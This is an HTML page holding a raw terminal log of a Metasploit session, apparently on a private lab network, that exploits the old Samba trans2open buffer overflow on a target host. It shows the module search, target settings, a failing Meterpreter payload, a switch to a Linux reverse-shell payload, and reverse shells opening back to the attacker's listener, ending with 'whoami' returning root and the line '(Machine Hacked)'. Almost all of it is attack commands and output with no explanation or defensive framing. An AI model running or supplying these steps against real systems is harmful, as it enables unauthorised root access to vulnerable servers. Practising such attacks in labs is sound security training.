<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Metasploit</title>
</head><body>┌──(kali㉿kali)-[~]<br/>
└─$ sudo msfconsole &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%% &nbsp; &nbsp; %%% &nbsp; &nbsp; &nbsp; &nbsp; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%% &nbsp;%% &nbsp;%%%%%%%% &nbsp; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%% &nbsp;% &nbsp;%%%%%%%% &nbsp; %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%<br/>
%% &nbsp;%% &nbsp;%%%%%% &nbsp; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%% &nbsp;%%%%%%%%% &nbsp; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%%%%% &nbsp;%%% &nbsp;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
%%%% &nbsp; &nbsp;%% &nbsp; %%%%%%%%%%% &nbsp;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% &nbsp;%%% &nbsp;%%%%%<br/>
%%%% &nbsp;%% &nbsp;%% &nbsp;% &nbsp; &nbsp; &nbsp;%% &nbsp; &nbsp; &nbsp;%% &nbsp; &nbsp;%%%%% &nbsp; &nbsp; &nbsp;% &nbsp; &nbsp;%%%% &nbsp;%% &nbsp; %%%%%% &nbsp; &nbsp; &nbsp; %%<br/>
%%%% &nbsp;%% &nbsp;%% &nbsp;% &nbsp;%%% %%%% &nbsp;%%%% &nbsp;%% &nbsp;%%%% &nbsp;%%%% &nbsp;%% %% &nbsp;%% %%% %% &nbsp;%%% &nbsp;%%%%%<br/>
%%%% &nbsp;%%%%%% &nbsp;%% &nbsp; %%%%%% &nbsp; %%%% &nbsp;%%% &nbsp;%%%% &nbsp;%% &nbsp; &nbsp;%% &nbsp;%%% %%% %% &nbsp; %% &nbsp;%%%%%<br/>
%%%%%%%%%%%% %%%% &nbsp; &nbsp; %%%%% &nbsp; &nbsp;%% &nbsp;%% &nbsp; % &nbsp; &nbsp;%% &nbsp;%%%% &nbsp;%%%% &nbsp; %%% &nbsp; %%% &nbsp; &nbsp; %<br/>
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% &nbsp;%%%%%%% %%%%%%%%%%%%%%<br/>
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%%%%%%%%%%%%%%<br/>
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;=[ metasploit v6.1.14-dev &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;]<br/>
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post &nbsp; &nbsp; &nbsp; ]<br/>
+ -- --=[ 592 payloads - 45 encoders - 10 nops &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;]<br/>
+ -- --=[ 9 evasion &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ]<br/>
<br/>
Metasploit tip: To save all commands executed since start up <br/>
to a file, use the makerc command<br/>
<br/>
msf6 &gt; search trans2open<br/>
<br/>
Matching Modules<br/>
================<br/>
<br/>
&nbsp; &nbsp;# &nbsp;Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Disclosure Date &nbsp;Rank &nbsp; Check &nbsp;Description<br/>
&nbsp; &nbsp;- &nbsp;---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------------- &nbsp;---- &nbsp; ----- &nbsp;-----------<br/>
&nbsp; &nbsp;0 &nbsp;exploit/freebsd/samba/trans2open &nbsp;2003-04-07 &nbsp; &nbsp; &nbsp; great &nbsp;No &nbsp; &nbsp; Samba trans2open Overflow (*BSD x86)<br/>
&nbsp; &nbsp;1 &nbsp;exploit/linux/samba/trans2open &nbsp; &nbsp;2003-04-07 &nbsp; &nbsp; &nbsp; great &nbsp;No &nbsp; &nbsp; Samba trans2open Overflow (Linux x86)<br/>
&nbsp; &nbsp;2 &nbsp;exploit/osx/samba/trans2open &nbsp; &nbsp; &nbsp;2003-04-07 &nbsp; &nbsp; &nbsp; great &nbsp;No &nbsp; &nbsp; Samba trans2open Overflow (Mac OS X PPC)<br/>
&nbsp; &nbsp;3 &nbsp;exploit/solaris/samba/trans2open &nbsp;2003-04-07 &nbsp; &nbsp; &nbsp; great &nbsp;No &nbsp; &nbsp; Samba trans2open Overflow (Solaris SPARC)<br/>
<br/>
<br/>
Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open<br/>
<br/>
msf6 &gt; use 1<br/>
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp<br/>
msf6 exploit(linux/samba/trans2open) &gt; options<br/>
<br/>
Module options (exploit/linux/samba/trans2open):<br/>
<br/>
&nbsp; &nbsp;Name &nbsp; &nbsp;Current Setting &nbsp;Required &nbsp;Description<br/>
&nbsp; &nbsp;---- &nbsp; &nbsp;--------------- &nbsp;-------- &nbsp;-----------<br/>
&nbsp; &nbsp;RHOSTS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tasploit<br/>
&nbsp; &nbsp;RPORT &nbsp; 139 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The target port (TCP)<br/>
<br/>
<br/>
Payload options (linux/x86/meterpreter/reverse_tcp):<br/>
<br/>
&nbsp; &nbsp;Name &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
&nbsp; &nbsp;---- &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
&nbsp; &nbsp;LHOST &nbsp;192.168.220.128 &nbsp;yes &nbsp; &nbsp; &nbsp; The listen address (an interface may be specified)<br/>
&nbsp; &nbsp;LPORT &nbsp;4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen port<br/>
<br/>
<br/>
Exploit target:<br/>
<br/>
&nbsp; &nbsp;Id &nbsp;Name<br/>
&nbsp; &nbsp;-- &nbsp;----<br/>
&nbsp; &nbsp;0 &nbsp; Samba 2.2.x - Bruteforce<br/>
<br/>
<br/>
msf6 exploit(linux/samba/trans2open) &gt; set RHOST 192.168.220.129<br/>
RHOST =&gt; 192.168.220.129<br/>
msf6 exploit(linux/samba/trans2open) &gt; exploit<br/>
<br/>
[*] Started reverse TCP handler on 192.168.220.128:4444 <br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffdfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffcfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffbfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffafc...<br/>
[*] Sending stage (984904 bytes) to 192.168.220.129<br/>
[*] 192.168.220.129 - Meterpreter session 1 closed. &nbsp;Reason: Died<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff9fc...<br/>
[*] Sending stage (984904 bytes) to 192.168.220.129<br/>
[*] 192.168.220.129 - Meterpreter session 2 closed. &nbsp;Reason: Died<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff8fc...<br/>
[*] Sending stage (984904 bytes) to 192.168.220.129<br/>
^C[-] 192.168.220.129:139 - Exploit failed [user-interrupt]: Interrupt <br/>
[-] exploit: Interrupted<br/>
msf6 exploit(linux/samba/trans2open) &gt; [*] 192.168.220.129 - Meterpreter session 3 closed. &nbsp;Reason: Died<br/>
<br/>
msf6 exploit(linux/samba/trans2open) &gt; options<br/>
<br/>
Module options (exploit/linux/samba/trans2open):<br/>
<br/>
&nbsp; &nbsp;Name &nbsp; &nbsp;Current Setting &nbsp;Required &nbsp;Description<br/>
&nbsp; &nbsp;---- &nbsp; &nbsp;--------------- &nbsp;-------- &nbsp;-----------<br/>
&nbsp; &nbsp;RHOSTS &nbsp;192.168.220.129 &nbsp;yes &nbsp; &nbsp; &nbsp; The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tasploit<br/>
&nbsp; &nbsp;RPORT &nbsp; 139 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The target port (TCP)<br/>
<br/>
<br/>
Payload options (linux/x86/meterpreter/reverse_tcp):<br/>
<br/>
&nbsp; &nbsp;Name &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
&nbsp; &nbsp;---- &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
&nbsp; &nbsp;LHOST &nbsp;192.168.220.128 &nbsp;yes &nbsp; &nbsp; &nbsp; The listen address (an interface may be specified)<br/>
&nbsp; &nbsp;LPORT &nbsp;4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen port<br/>
<br/>
<br/>
Exploit target:<br/>
<br/>
&nbsp; &nbsp;Id &nbsp;Name<br/>
&nbsp; &nbsp;-- &nbsp;----<br/>
&nbsp; &nbsp;0 &nbsp; Samba 2.2.x - Bruteforce<br/>
<br/>
<br/>
msf6 exploit(linux/samba/trans2open) &gt; <br/>
[-] Meterpreter session 1 is not valid and will be closed<br/>
[-] Meterpreter session 2 is not valid and will be closed<br/>
[-] Meterpreter session 3 is not valid and will be closed<br/>
Interrupt: use the 'exit' command to quit<br/>
msf6 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell<br/>
set payload linux/x86/shell/bind_ipv6_tcp &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell/reverse_tcp<br/>
set payload linux/x86/shell/bind_ipv6_tcp_uuid &nbsp; &nbsp;set payload linux/x86/shell/reverse_tcp_uuid<br/>
set payload linux/x86/shell/bind_nonx_tcp &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell_bind_ipv6_tcp<br/>
set payload linux/x86/shell/bind_tcp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_bind_tcp<br/>
set payload linux/x86/shell/bind_tcp_uuid &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell_bind_tcp_random_port<br/>
set payload linux/x86/shell/reverse_ipv6_tcp &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_reverse_tcp<br/>
set payload linux/x86/shell/reverse_nonx_tcp &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_reverse_tcp_ipv6<br/>
msf6 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell<br/>
set payload linux/x86/shell/bind_ipv6_tcp &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell/reverse_tcp<br/>
set payload linux/x86/shell/bind_ipv6_tcp_uuid &nbsp; &nbsp;set payload linux/x86/shell/reverse_tcp_uuid<br/>
set payload linux/x86/shell/bind_nonx_tcp &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell_bind_ipv6_tcp<br/>
set payload linux/x86/shell/bind_tcp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_bind_tcp<br/>
set payload linux/x86/shell/bind_tcp_uuid &nbsp; &nbsp; &nbsp; &nbsp; set payload linux/x86/shell_bind_tcp_random_port<br/>
set payload linux/x86/shell/reverse_ipv6_tcp &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_reverse_tcp<br/>
set payload linux/x86/shell/reverse_nonx_tcp &nbsp; &nbsp; &nbsp;set payload linux/x86/shell_reverse_tcp_ipv6<br/>
msf6 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcp<br/>
payload =&gt; linux/x86/shell_reverse_tcp<br/>
msf6 exploit(linux/samba/trans2open) &gt; exploit<br/>
<br/>
[*] Started reverse TCP handler on 192.168.220.128:4444 <br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffdfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffcfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffbfc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffffafc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff9fc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff8fc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff7fc...<br/>
[*] 192.168.220.129:139 - Trying return address 0xbffff6fc...<br/>
[*] Command shell session 4 opened (192.168.220.128:4444 -&gt; 192.168.220.129:32772 ) at 2021-11-20 03:23:15 -0500<br/>
<br/>
[*] Command shell session 5 opened (192.168.220.128:4444 -&gt; 192.168.220.129:32773 ) at 2021-11-20 03:23:16 -0500<br/>
[*] Command shell session 6 opened (192.168.220.128:4444 -&gt; 192.168.220.129:32774 ) at 2021-11-20 03:23:20 -0500<br/>
<br/>
whoami<br/>
root<br/>
<br/>
(Machine Hacked)</body></html>